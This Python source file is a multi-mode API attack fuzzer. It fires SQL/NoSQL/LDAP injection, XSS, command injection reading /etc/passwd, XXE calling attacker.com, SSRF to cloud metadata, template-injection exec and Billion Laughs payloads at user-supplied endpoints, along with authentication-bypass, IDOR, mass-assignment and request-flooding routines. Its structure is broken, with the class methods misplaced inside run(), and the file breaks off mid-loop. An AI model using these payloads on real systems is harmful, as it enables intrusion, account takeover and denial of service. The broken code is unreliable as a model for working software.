#!/usr/bin/env python3
"""
API Endpoint Fuzzer - Professional Edition
Advanced API security testing with intelligent fuzzing, vulnerability detection, and comprehensive analysis
"""

import requests
import json
import random
import string
import hashlib
import base64
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import re
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class APIFuzzer:
    def __init__(self):
        self.results = []
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.verify = False
        self.seen_hashes = set()
        
        # Professional user agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        ]
        
        # Advanced payload library
        self.payloads = {
            'sql_injection': [
                "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
                "admin'--", "admin' #", "admin'/*",
                "' or 1=1--", "' or 1=1#", "' or 1=1/*",
                "') or '1'='1--", "') or ('1'='1--",
                "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
                "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
                "1' AND 1=1--", "1' AND 1=2--",
                "admin' AND '1'='1", "admin' AND '1'='2",
            ],
            'nosql_injection': [
                '{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}',
                '{"$where": "1==1"}', '{"$nin": []}',
                '[$ne]=1', '[$gt]=', '[$regex]=.*',
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
                '{"$or": [{"username": "admin"}, {"username": "root"}]}',
            ],
            'xss': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<iframe src="javascript:alert(1)">',
                '<body onload=alert(1)>',
                '"-alert(1)-"',
                '\';alert(1);//',
            ],
            'command_injection': [
                '| whoami', '; whoami', '`whoami`', '$(whoami)',
                '| id', '; id', '`id`', '$(id)',
                '| ls -la', '; ls -la', '`ls -la`', '$(ls -la)',
                '| cat /etc/passwd', '; cat /etc/passwd',
                '|| whoami', '& whoami', '&& whoami',
                '|ping -c 10 127.0.0.1', ';ping -c 10 127.0.0.1',
            ],
            'path_traversal': [
                '../', '..\\', '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '....//....//....//etc/passwd',
                '%2e%2e%2f', '%252e%252e%252f',
                '..%252f..%252f..%252fetc%252fpasswd',
                '/etc/passwd', 'C:\\windows\\win.ini',
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            ],
            'ssrf': [
                'http://localhost', 'http://127.0.0.1', 'http://0.0.0.0',
                'http://169.254.169.254/latest/meta-data/',
                'http://metadata.google.internal/computeMetadata/v1/',
                'file:///etc/passwd', 'file:///c:/windows/win.ini',
                'dict://localhost:11211', 'gopher://localhost:11211',
            ],
            'ldap_injection': [
                '*', '*)(&', '*)(uid=*))(|(uid=*',
                'admin)(&(password=*))', '*)(&(objectClass=*',
            ],
            'template_injection': [
                '{{7*7}}', '${7*7}', '<%= 7*7 %>',
                '{{config}}', '{{self}}', '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
                '#{7*7}', '*{7*7}',
            ],
            'jwt_manipulation': [
                'none', 'HS256', 'RS256',
            ],
            'overflow': [
                'A' * 100, 'A' * 1000, 'A' * 10000, 'A' * 100000,
            ],
            'format_string': [
                '%s%s%s%s%s', '%x%x%x%x%x', '%n%n%n%n',
                '%p%p%p%p', '%d%d%d%d',
            ],
            'integer': [
                -1, 0, 1, 2147483647, 2147483648,
                -2147483648, -2147483649, 9999999999,
            ],
            'special_chars': [
                '!@#$%^&*()', '<>?:"{}|[]\\', '\n\r\t\0',
                '`~', ';:\'",.<>/?',
            ],
            'unicode': [
                '\u0000', '\uFFFD', '测试', '🔥💯',
                '\u202e', '\u200b',
            ],
        }

def run():
    print("\033[92m" + "="*70)
    print("     API ENDPOINT FUZZER - PROFESSIONAL EDITION")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] OFFENSIVE SECURITY TOOL - Authorized use only!\033[0m\n")
    
    print("\033[97mSelect fuzzing mode:\033[0m")
    print("  [1] Smart REST API Fuzzer (with vulnerability detection)")
    print("  [2] Advanced GraphQL Fuzzer")
    print("  [3] SOAP/XML Fuzzer")
    print("  [4] Authentication Bypass Hunter")
    print("  [5] Authorization Testing (IDOR/Privilege Escalation)")
    print("  [6] Parameter Pollution & HPP")
    print("  [7] Mass Assignment Attack")
    print("  [8] Rate Limit & DoS Testing")
    print("  [9] API Enumeration & Discovery")
    print("  [10] Full Automated Scan")
    
    choice = input("\n\033[95m[?] Select mode (1-10): \033[0m").strip()
    
    fuzzer = APIFuzzer()
    
    if choice == '1':
        fuzzer.smart_rest_fuzzer()
    elif choice == '2':
        fuzzer.advanced_graphql_fuzzer()
    elif choice == '3':
        fuzzer.soap_xml_fuzzer()
    elif choice == '4':
        fuzzer.auth_bypass_hunter()
    elif choice == '5':
        fuzzer.authorization_testing()
    elif choice == '6':
        fuzzer.parameter_pollution()
    elif choice == '7':
        fuzzer.mass_assignment_attack()
    elif choice == '8':
        fuzzer.rate_limit_testing()
    elif choice == '9':
        fuzzer.api_enumeration()
    elif choice == '10':
        fuzzer.full_automated_scan()
    else:
        print("\033[91m[!] Invalid choice.\033[0m")
        return
    
    # Display results
    fuzzer.display_results()
    
    # Save results
    if fuzzer.vulnerabilities:
        save_choice = input("\n\033[95m[?] Save results? (y/n): \033[0m").strip().lower()
        if save_choice == 'y':
            format_type = input("\033[95m[?] Format (json/txt, default json): \033[0m").strip().lower()
            format_type = format_type if format_type in ['json', 'txt'] else 'json'
            fuzzer.save_results(f"api_fuzz_results.{format_type}", format_type)

    def get_response_hash(self, content: str) -> str:
        """Generate MD5 hash for duplicate detection"""
        return hashlib.md5(content.encode('utf-8', errors='ignore')).hexdigest()
    
    def calculate_severity(self, vuln_type: str, indicators: list) -> str:
        """Calculate vulnerability severity"""
        severity_weights = {
            'SQL Injection': 90,
            'Command Injection': 95,
            'XXE': 85,
            'SSRF': 80,
            'NoSQL Injection': 85,
            'Authentication Bypass': 95,
            'Authorization Bypass': 90,
            'XSS': 70,
            'Path Traversal': 75,
            'IDOR': 80,
            'Mass Assignment': 70,
            'Rate Limit': 50,
        }
        
        base_score = severity_weights.get(vuln_type, 50)
        indicator_bonus = len(indicators) * 5
        
        total = min(base_score + indicator_bonus, 100)
        
        if total >= 80:
            return 'CRITICAL'
        elif total >= 60:
            return 'HIGH'
        elif total >= 40:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def analyze_response(self, response, payload_type: str, payload: str) -> dict:
        """Analyze response for vulnerabilities"""
        indicators = []
        vuln_detected = False
        
        # SQL Injection indicators
        if payload_type == 'sql_injection':
            sql_errors = [
                'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                'syntax error', 'unclosed quotation', 'quoted string not properly terminated',
                'ole db', 'odbc', 'jdbc', 'mssql', 'warning: mysql',
            ]
            for error in sql_errors:
                if error in response.text.lower():
                    indicators.append(f"SQL error: {error}")
                    vuln_detected = True
        
        # NoSQL Injection indicators
        elif payload_type == 'nosql_injection':
            nosql_errors = ['mongodb', 'mongoose', 'nosql', 'bson', 'cast to objectid failed']
            for error in nosql_errors:
                if error in response.text.lower():
                    indicators.append(f"NoSQL error: {error}")
                    vuln_detected = True
        
        # Command Injection indicators
        elif payload_type == 'command_injection':
            cmd_indicators = ['uid=', 'gid=', 'groups=', 'root:', '/bin/', 'windows\\']
            for indicator in cmd_indicators:
                if indicator in response.text.lower():
                    indicators.append(f"Command output: {indicator}")
                    vuln_detected = True
        
        # XXE indicators
        elif payload_type == 'xxe':
            xxe_indicators = ['root:x:', 'windows\\', '<!entity', 'system "file']
            for indicator in xxe_indicators:
                if indicator in response.text.lower():
                    indicators.append(f"XXE: {indicator}")
                    vuln_detected = True
        
        # SSRF indicators
        elif payload_type == 'ssrf':
            if response.status_code == 200 and len(response.content) > 0:
                ssrf_indicators = ['ami-', 'instance-id', 'metadata', 'ec2', 'computemetadata']
                for indicator in ssrf_indicators:
                    if indicator in response.text.lower():
                        indicators.append(f"SSRF: {indicator}")
                        vuln_detected = True
        
        # XSS indicators (reflected in response)
        elif payload_type == 'xss':
            if payload in response.text and '<' in payload:
                indicators.append("XSS payload reflected")
                vuln_detected = True
        
        # Generic error indicators
        error_patterns = [
            'exception', 'stack trace', 'traceback', 'error on line',
            'syntax error', 'parse error', 'fatal error', 'warning:',
            'undefined index', 'undefined offset', 'notice:',
        ]
        
        for pattern in error_patterns:
            if pattern in response.text.lower():
                indicators.append(f"Error disclosure: {pattern}")
        
        # Check response time for potential blind injection
        if hasattr(response, 'elapsed') and response.elapsed.total_seconds() > 10:
            indicators.append("Slow response (possible time-based attack)")
        
        # Check status codes
        if response.status_code == 500:
            indicators.append("Server error (500)")
        elif response.status_code == 403:
            indicators.append("Forbidden (403) - possible WAF/filter")
        
        return {
            'vulnerable': vuln_detected,
            'indicators': indicators,
            'status_code': response.status_code,
            'response_length': len(response.content),
        }
    
    def smart_rest_fuzzer(self):
        """Advanced REST API fuzzer with intelligent detection"""
        print("\n\033[92m[*] Smart REST API Fuzzer\033[0m\n")
        
        url = input("\033[97m[?] API endpoint URL: \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        # Test connection first
        print(f"\n\033[97m[*] Testing connection to {url}...\033[0m")
        try:
            test_resp = self.session.get(url, timeout=10)
            print(f"\033[92m[+] Connection successful (Status: {test_resp.status_code})\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Connection failed: {str(e)}\033[0m")
            return
        
        # Get method
        print("\n\033[97mHTTP Method:\033[0m")
        print("  [1] GET  [2] POST  [3] PUT  [4] DELETE  [5] PATCH")
        method_choice = input("\033[95m[?] Select (default GET): \033[0m").strip()
        methods = {'1': 'GET', '2': 'POST', '3': 'PUT', '4': 'DELETE', '5': 'PATCH'}
        method = methods.get(method_choice, 'GET')
        
        # Payload types to test
        print("\n\033[97mSelect payload categories to test:\033[0m")
        print("  [1] All payloads (comprehensive)")
        print("  [2] Injection only (SQL, NoSQL, Command, LDAP)")
        print("  [3] XSS and client-side")
        print("  [4] Server-side (XXE, SSRF, Template)")
        print("  [5] Custom selection")
        
        payload_choice = input("\033[95m[?] Select: \033[0m").strip()
        
        if payload_choice == '2':
            selected_payloads = ['sql_injection', 'nosql_injection', 'command_injection', 'ldap_injection']
        elif payload_choice == '3':
            selected_payloads = ['xss']
        elif payload_choice == '4':
            selected_payloads = ['xxe', 'ssrf', 'template_injection']
        else:
            selected_payloads = list(self.payloads.keys())
        
        # Threading
        threads = int(input("\033[95m[?] Number of threads (1-20, default 10): \033[0m").strip() or "10")
        threads = max(1, min(20, threads))
        
        print(f"\n\033[97m[*] Starting fuzzing with {threads} threads...\033[0m\n")
        
        total_tests = 0
        vulnerabilities_found = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for payload_type in selected_payloads:
                if payload_type not in self.payloads:
                    continue
                
                print(f"\033[93m[*] Testing {payload_type}...\033[0m")
                
                for payload in self.payloads[payload_type]:
                    future = executor.submit(
                        self._test_payload,
                        url, method, payload_type, payload
                    )
                    futures.append(future)
                    total_tests += 1
            
            # Process results
            for future in as_completed(futures):
                result = future.result()
                if result and result.get('vulnerable'):
                    vulnerabilities_found += 1
                    self.vulnerabilities.append(result)
                    self._display_vulnerability(result)
        
        print(f"\n\033[92m{'='*70}\033[0m")
        print(f"\033[97m[*] Fuzzing complete!\033[0m")
        print(f"\033[97m  Total tests: {total_tests}\033[0m")
        print(f"\033[91m  Vulnerabilities: {vulnerabilities_found}\033[0m")
        print(f"\033[92m{'='*70}\033[0m")
    
    def _test_payload(self, url: str, method: str, payload_type: str, payload):
        """Test individual payload"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/json',
            }
            
            if method in ['POST', 'PUT', 'PATCH']:
                # Test in JSON body
                data = {
                    'test': payload,
                    'value': payload,
                    'input': payload,
                }
                response = self.session.request(
                    method, url,
                    json=data,
                    headers=headers,
                    timeout=15,
                )
            else:
                # Test in query parameters
                params = {
                    'test': payload,
                    'value': payload,
                    'input': payload,
                }
                response = self.session.request(
                    method, url,
                    params=params,
                    headers=headers,
                    timeout=15,
                )
            
            # Analyze response
            analysis = self.analyze_response(response, payload_type, str(payload))
            
            if analysis['vulnerable'] or analysis['indicators']:
                severity = self.calculate_severity(payload_type.replace('_', ' ').title(), analysis['indicators'])
                
                return {
                    'url': url,
                    'method': method,
                    'payload_type': payload_type,
                    'payload': str(payload)[:200],
                    'vulnerable': analysis['vulnerable'],
                    'severity': severity,
                    'indicators': analysis['indicators'],
                    'status_code': analysis['status_code'],
                    'response_length': analysis['response_length'],
                    'timestamp': datetime.now().isoformat(),
                }
        
        except requests.Timeout:
            return {
                'url': url,
                'payload_type': payload_type,
                'payload': str(payload)[:200],
                'vulnerable': True,
                'severity': 'MEDIUM',
                'indicators': ['Request timeout - possible DoS or time-based attack'],
                'status_code': 0,
                'timestamp': datetime.now().isoformat(),
            }
        except Exception:
            pass
        
        return None
    
    def _display_vulnerability(self, vuln: dict):
        """Display vulnerability finding"""
        severity_colors = {
            'CRITICAL': '\033[91m',  # Red
            'HIGH': '\033[93m',      # Yellow
            'MEDIUM': '\033[96m',    # Cyan
            'LOW': '\033[92m',       # Green
        }
        
        color = severity_colors.get(vuln.get('severity', 'LOW'), '\033[97m')
        
        print(f"\n{color}[{vuln.get('severity', 'UNKNOWN')}] {vuln.get('payload_type', 'Unknown').replace('_', ' ').title()}\033[0m")
        print(f"\033[97m  URL: {vuln.get('url', 'N/A')}\033[0m")
        print(f"\033[97m  Method: {vuln.get('method', 'N/A')}\033[0m")
        print(f"\033[97m  Payload: {vuln.get('payload', 'N/A')[:100]}\033[0m")
        print(f"\033[97m  Status: {vuln.get('status_code', 'N/A')}\033[0m")
        
        if vuln.get('indicators'):
            print(f"\033[97m  Indicators:\033[0m")
            for indicator in vuln['indicators'][:5]:
                print(f"\033[97m    - {indicator}\033[0m")
    
    def advanced_graphql_fuzzer(self):
        """Advanced GraphQL fuzzer with comprehensive testing"""
        print("\n\033[92m[*] Advanced GraphQL Fuzzer\033[0m\n")
        
        url = input("\033[97m[?] GraphQL endpoint URL: \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        print(f"\n\033[97m[*] Testing GraphQL endpoint: {url}\033[0m\n")
        
        graphql_tests = {
            'Introspection Query': {
                'query': '{ __schema { types { name fields { name } } } }',
                'severity': 'MEDIUM',
                'description': 'Schema introspection enabled',
            },
            'Mutation Enumeration': {
                'query': '{ __schema { mutationType { fields { name } } } }',
                'severity': 'LOW',
                'description': 'Mutation enumeration',
            },
            'Directive Discovery': {
                'query': '{ __schema { directives { name description locations } } }',
                'severity': 'LOW',
                'description': 'Directive discovery',
            },
            'Batch Query Attack': {
                'query': '[' + ','.join(['{"query":"{ users { id } }"}'] * 10) + ']',
                'severity': 'MEDIUM',
                'description': 'Batch query DoS',
            },
            'Depth Attack': {
                'query': '{ user { posts { comments { author { posts { comments { id } } } } } } }',
                'severity': 'HIGH',
                'description': 'Query depth attack',
            },
            'Alias Overload': {
                'query': '{ ' + ' '.join([f'user{i}: user(id: {i}){{id}}' for i in range(100)]) + ' }',
                'severity': 'MEDIUM',
                'description': 'Alias overload attack',
            },
            'Field Duplication': {
                'query': '{ user(id: 1) { ' + ' '.join(['name'] * 100) + ' } }',
                'severity': 'LOW',
                'description': 'Field duplication',
            },
            'SQL Injection in Variable': {
                'query': 'query($id: String!) { user(id: $id) { name } }',
                'variables': {'id': "1' OR '1'='1"},
                'severity': 'CRITICAL',
                'description': 'SQL injection via variables',
            },
        }
        
        for test_name, test_data in graphql_tests.items():
            try:
                print(f"\033[93m[*] Testing: {test_name}\033[0m")
                
                headers = {'Content-Type': 'application/json'}
                
                if isinstance(test_data['query'], str) and test_data['query'].startswith('['):
                    payload = test_data['query']
                else:
                    payload_dict = {'query': test_data['query']}
                    if 'variables' in test_data:
                        payload_dict['variables'] = test_data['variables']
                    payload = json.dumps(payload_dict)
                
                response = self.session.post(url, data=payload, headers=headers, timeout=10)
                
                vulnerable = False
                indicators = []
                
                if response.status_code == 200:
                    try:
                        resp_json = response.json()
                        
                        # Check for successful introspection
                        if '__schema' in str(resp_json) and 'errors' not in resp_json:
                            vulnerable = True
                            indicators.append("GraphQL introspection enabled")
                        
                        # Check for successful query without errors
                        if 'data' in resp_json and 'errors' not in resp_json:
                            if test_name in ['Batch Query Attack', 'Depth Attack', 'Alias Overload']:
                                vulnerable = True
                                indicators.append(f"{test_name} successful")
                        
                        # Check for SQL errors
                        if 'errors' in resp_json:
                            for error in resp_json['errors']:
                                error_msg = str(error).lower()
                                if any(kw in error_msg for kw in ['sql', 'mysql', 'postgresql', 'syntax']):
                                    vulnerable = True
                                    indicators.append("SQL error in GraphQL response")
                    
                    except json.JSONDecodeError:
                        pass
                
                if vulnerable:
                    vuln = {
                        'url': url,
                        'method': 'POST',
                        'payload_type': 'GraphQL',
                        'payload': test_name,
                        'vulnerable': True,
                        'severity': test_data['severity'],
                        'indicators': indicators,
                        'status_code': response.status_code,
                        'description': test_data['description'],
                        'timestamp': datetime.now().isoformat(),
                    }
                    self.vulnerabilities.append(vuln)
                    self._display_vulnerability(vuln)
                
                time.sleep(0.5)
            
            except Exception as e:
                print(f"\033[91m[!] Error: {str(e)[:50]}\033[0m")
    
    def soap_xml_fuzzer(self):
        """Advanced SOAP/XML fuzzer"""
        print("\n\033[92m[*] SOAP/XML Fuzzer\033[0m\n")
        
        url = input("\033[97m[?] SOAP endpoint URL: \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        action = input("\033[97m[?] SOAPAction header (optional): \033[0m").strip()
        
        xml_attacks = {
            'XXE - File Read': '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body><test>&xxe;</test></soap:Body>
</soap:Envelope>''',
            'XXE - SSRF': '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body><test>&xxe;</test></soap:Body>
</soap:Envelope>''',
            'Billion Laughs': '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body><test>&lol3;</test></soap:Body>
</soap:Envelope>''',
            'XPath Injection': '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body><Login><username>' or '1'='1</username><password>' or '1'='1</password></Login></soap:Body>
</soap:Envelope>''',
            'Command Injection': '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body><test>; whoami</test></soap:Body>
</soap:Envelope>''',
        }
        
        print(f"\n\033[97m[*] Testing {len(xml_attacks)} XML/SOAP attacks...\033[0m\n")
        
        for attack_name, payload in xml_attacks.items():
            try:
                print(f"\033[93m[*] Testing: {attack_name}\033[0m")
                
                headers = {
                    'Content-Type': 'text/xml; charset=utf-8',
                    'SOAPAction': action or ''
                }
                
                response = self.session.post(url, data=payload, headers=headers, timeout=10)
                
                analysis = self.analyze_response(response, 'xxe' if 'XXE' in attack_name else 'command_injection', payload)
                
                if analysis['vulnerable'] or 'error' in response.text.lower():
                    vuln = {
                        'url': url,
                        'method': 'POST',
                        'payload_type': 'SOAP/XML',
                        'payload': attack_name,
                        'vulnerable': analysis['vulnerable'],
                        'severity': 'CRITICAL' if 'XXE' in attack_name else 'HIGH',
                        'indicators': analysis['indicators'],
                        'status_code': analysis['status_code'],
                        'timestamp': datetime.now().isoformat(),
                    }
                    self.vulnerabilities.append(vuln)
                    self._display_vulnerability(vuln)
            
            except Exception as e:
                print(f"\033[91m[!] Error: {str(e)[:50]}\033[0m")
    
    def auth_bypass_hunter(self):
        """Hunt for authentication bypass vulnerabilities"""
        print("\n\033[92m[*] Authentication Bypass Hunter\033[0m\n")
        
        url = input("\033[97m[?] Authentication endpoint URL: \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        bypass_payloads = [
            # SQL injection bypasses
            {'username': "admin'--", 'password': ''},
            {'username': "admin' or '1'='1'--", 'password': 'anything'},
            {'username': "' or 1=1--", 'password': "' or 1=1--"},
            
            # NoSQL injection bypasses
            {'username': {'$gt': ''}, 'password': {'$gt': ''}},
            {'username': {'$ne': None}, 'password': {'$ne': None}},
            {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
            
            # Array/object bypasses
            {'username': ['admin'], 'password': ['admin']},
            {'username[]': 'admin', 'password[]': 'admin'},
            
            # Boolean/type juggling
            {'username': True, 'password': True},
            {'username': 'admin', 'password': True},
            {'username': 0, 'password': 0},
            
            # Null/empty bypasses
            {'username': '', 'password': ''},
            {'username': None, 'password': None},
            {'username': 'admin', 'password': ''},
            
            # LDAP injection
            {'username': '*', 'password': '*'},
            {'username': 'admin)(&(password=*))', 'password': 'x'},
        ]
        
        print(f"\n\033[97m[*] Testing {len(bypass_payloads)} bypass techniques...\033[0m\n")
        
        # Get baseline response
        try:
            baseline = self.session.post(url, json={'username': 'invaliduser123', 'password': 'invalidpass123'}, timeout=10)
            baseline_hash = self.get_response_hash(baseline.text)
        except:
            baseline_hash = None
        
        for i, payload in enumerate(bypass_payloads, 1):
            try:
                print(f"\033[93m[{i}/{len(bypass_payloads)}] Testing: {str(payload)[:60]}...\033[0m")
                
                response = self.session.post(url, json=payload, timeout=10)
                response_hash = self.get_response_hash(response.text)
                
                vulnerable = False
                indicators = []
                
                # Check for successful auth indicators
                success_keywords = ['token', 'jwt', 'session', 'logged in', 'success', 'welcome', 'dashboard']
                for keyword in success_keywords:
                    if keyword in response.text.lower():
                        vulnerable = True
                        indicators.append(f"Success keyword found: {keyword}")
                
                # Check if response differs from baseline
                if baseline_hash and response_hash != baseline_hash and response.status_code in [200, 201, 302]:
                    vulnerable = True
                    indicators.append("Response differs from failed login baseline")
                
                # Check for SQL/NoSQL errors (might indicate vulnerability)
                analysis = self.analyze_response(response, 'sql_injection', str(payload))
                if analysis['indicators']:
                    vulnerable = True
                    indicators.extend(analysis['indicators'])
                
                if vulnerable:
                    vuln = {
                        'url': url,
                        'method': 'POST',
                        'payload_type': 'Authentication Bypass',
                        'payload': str(payload)[:200],
                        'vulnerable': True,
                        'severity': 'CRITICAL',
                        'indicators': indicators,
                        'status_code': response.status_code,
                        'timestamp': datetime.now().isoformat(),
                    }
                    self.vulnerabilities.append(vuln)
                    self._display_vulnerability(vuln)
            
            except Exception as e:
                pass
    
    def authorization_testing(self):
        """Test for IDOR and privilege escalation"""
        print("\n\033[92m[*] Authorization Testing (IDOR/Privilege Escalation)\033[0m\n")
        
        url = input("\033[97m[?] API endpoint with ID parameter (e.g., /api/users/1): \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        print("\n\033[97m[*] Testing IDOR vulnerabilities...\033[0m\n")
        
        # Test different ID formats
        test_ids = [1, 2, 3, 100, 999, -1, 0, 'admin', 'root', '../2', '../../3']
        
        responses = {}
        
        for test_id in test_ids:
            try:
                test_url = re.sub(r'/\d+/?$', f'/{test_id}', url)
                response = self.session.get(test_url, timeout=10)
                
                print(f"\033[93m[*] Testing ID: {test_id} - Status: {response.status_code}\033[0m")
                
                if response.status_code == 200:
                    response_hash = self.get_response_hash(response.text)
                    responses[test_id] = response_hash
            except:
                pass
        
        # Check for IDOR
        if len(set(responses.values())) > 1:
            print(f"\n\033[91m[!] Possible IDOR detected - {len(responses)} different responses\033[0m")
            
            vuln = {
                'url': url,
                'method': 'GET',
                'payload_type': 'IDOR',
                'payload': f'Tested IDs: {test_ids}',
                'vulnerable': True,
                'severity': 'HIGH',
                'indicators': [f'{len(responses)} unique responses found'],
                'status_code': 200,
                'timestamp': datetime.now().isoformat(),
            }
            self.vulnerabilities.append(vuln)
    
    def parameter_pollution(self):
        """HTTP Parameter Pollution testing"""
        print("\n\033[92m[*] HTTP Parameter Pollution Testing\033[0m\n")
        
        url = input("\033[97m[?] Target URL: \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        params = ['id', 'user', 'role', 'admin', 'access']
        
        print(f"\n\033[97m[*] Testing parameter pollution...\033[0m\n")
        
        for param in params:
            try:
                # Normal request
                normal_resp = self.session.get(url, params={param: '1'}, timeout=10)
                normal_hash = self.get_response_hash(normal_resp.text)
                
                # Polluted request
                polluted_url = f"{url}?{param}=1&{param}=2"
                polluted_resp = self.session.get(polluted_url, timeout=10)
                polluted_hash = self.get_response_hash(polluted_resp.text)
                
                if normal_hash != polluted_hash:
                    print(f"\033[92m[+] HPP detected: {param}\033[0m")
                    
                    vuln = {
                        'url': url,
                        'method': 'GET',
                        'payload_type': 'Parameter Pollution',
                        'payload': f'{param}=1&{param}=2',
                        'vulnerable': True,
                        'severity': 'MEDIUM',
                        'indicators': ['Different responses with duplicate parameters'],
                        'status_code': polluted_resp.status_code,
                        'timestamp': datetime.now().isoformat(),
                    }
                    self.vulnerabilities.append(vuln)
            except:
                pass
    
    def mass_assignment_attack(self):
        """Test mass assignment vulnerabilities"""
        print("\n\033[92m[*] Mass Assignment Attack Testing\033[0m\n")
        
        url = input("\033[97m[?] API endpoint (POST/PUT): \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        privileged_fields = [
            {'isAdmin': True}, {'admin': True}, {'role': 'admin'},
            {'is_admin': True}, {'is_superuser': True},
            {'permissions': 'all'}, {'access_level': 999},
            {'verified': True}, {'active': True}, {'enabled': True},
        ]
        
        print(f"\n\033[97m[*] Testing {len(privileged_fields)} privileged fields...\033[0m\n")
        
        for field_data in privileged_fields:
            try:
                payload = {'username': 'testuser', 'email': 'test@test.com', **field_data}
                
                response = self.session.post(url, json=payload, timeout=10)
                field_name = list(field_data.keys())[0]
                
                print(f"\033[93m[*] Testing: {field_name}\033[0m")
                
                if response.status_code in [200, 201] and field_name in response.text:
                    print(f"\033[92m[+] Field accepted: {field_name}\033[0m")
                    
                    vuln = {
                        'url': url,
                        'method': 'POST',
                        'payload_type': 'Mass Assignment',
                        'payload': str(field_data),
                        'vulnerable': True,
                        'severity': 'HIGH',
                        'indicators': [f'Privileged field accepted: {field_name}'],
                        'status_code': response.status_code,
                        'timestamp': datetime.now().isoformat(),
                    }
                    self.vulnerabilities.append(vuln)
            except:
                pass
    
    def rate_limit_testing(self):
        """Test rate limiting"""
        print("\n\033[92m[*] Rate Limit Testing\033[0m\n")
        
        url = input("\033[97m[?] API endpoint: \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        num_requests = int(input("\033[95m[?] Requests to send (default 100): \033[0m").strip() or "100")
        
        print(f"\n\033[97m[*] Sending {num_requests} requests...\033[0m\n")
        
        rate_limited = False
        successful = 0
        failed = 0
        start_time = time.time()
        
        for i in range(1, num_requests + 1):
            try:
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 429:
                    rate_limited = True
                    failed += 1
                elif response.status_code == 200:
                    successful += 1
                else:
                    failed += 1
                
                if i % 10 == 0:
                    print(f"\r\033[97m[*] Progress: {i}/{num_requests}\033[0m", end='', flush=True)
            except:
                failed += 1
        
        elapsed = time.time() - start_time
        
        print(f"\n\n\033[92m{'='*70}\033[0m")
        print(f"\033[97m  Successful: {successful}\033[0m")
        print(f"\033[97m  Failed: {failed}\033[0m")
        print(f"\033[97m  Rate: {num_requests/elapsed:.2f} req/s\033[0m")
        
        if not rate_limited:
            print(f"\n\033[91m[!] No rate limiting detected!\033[0m")
            
            vuln = {
                'url': url,
                'payload_type': 'Rate Limit',
                'vulnerable': True,
                'severity': 'MEDIUM',
                'indicators': [f'{num_requests} requests without rate limiting'],
                'timestamp': datetime.now().isoformat(),
            }
            self.vulnerabilities.append(vuln)
    
    def api_enumeration(self):
        """Enumerate API endpoints"""
        print("\n\033[92m[*] API Enumeration & Discovery\033[0m\n")
        
        base_url = input("\033[97m[?] Base URL: \033[0m").strip()
        if not base_url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        endpoints = [
            '/api/v1/users', '/api/v2/users', '/api/users',
            '/api/v1/admin', '/api/admin', '/admin',
            '/api/v1/config', '/api/config', '/config',
            '/api/v1/debug', '/api/debug', '/debug',
            '/api/v1/swagger', '/api/swagger', '/swagger',
            '/api-docs', '/docs', '/graphql', '/graphiql',
        ]
        
        print(f"\n\033[97m[*] Testing {len(endpoints)} common endpoints...\033[0m\n")
        
        found = 0
        
        for endpoint in endpoints:
            try:
